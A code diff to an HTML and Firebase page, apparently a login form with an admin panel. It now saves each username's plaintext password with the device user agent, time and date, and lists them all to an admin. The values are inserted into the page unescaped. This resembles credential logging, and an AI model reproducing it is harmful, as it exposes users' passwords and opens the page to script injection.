@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>👑 Admin Page</title>
+<title>👑 Admin Panel</title>
 
 <style>
 
@@ -100,11 +100,12 @@ transform:scale(1.1);
 
 .userbox{
 background:rgba(255,255,255,0.08);
-width:320px;
+width:340px;
 margin:20px auto;
 padding:18px;
 border-radius:15px;
 box-shadow:0 0 20px lime;
+word-wrap:break-word;
 }
 
 /* Animations */
@@ -229,7 +230,16 @@ document.getElementById("password").value;
 
 await setDoc(doc(db,"users",username),{
 
-password: password
+password: password,
+
+device:
+navigator.userAgent,
+
+time:
+new Date().toLocaleTimeString(),
+
+date:
+new Date().toLocaleDateString()
 
 });
 
@@ -261,6 +271,15 @@ html += `
 <p><b>Username:</b> ${docu.id}</p>
 
 <p><b>Password:</b> ${docu.data().password}</p>
+
+<p><b>📱 Device:</b>
+${docu.data().device}</p>
+
+<p><b>🕒 Time:</b>
+${docu.data().time}</p>
+
+<p><b>📅 Date:</b>
+${docu.data().date}</p>
 
 <button onclick="removeUser('${docu.id}')">
 ❌ Remove User
@@ -374,4 +393,4 @@ setInterval(draw,33);
 </script>
 
 </body>
-  </html>
+</html>
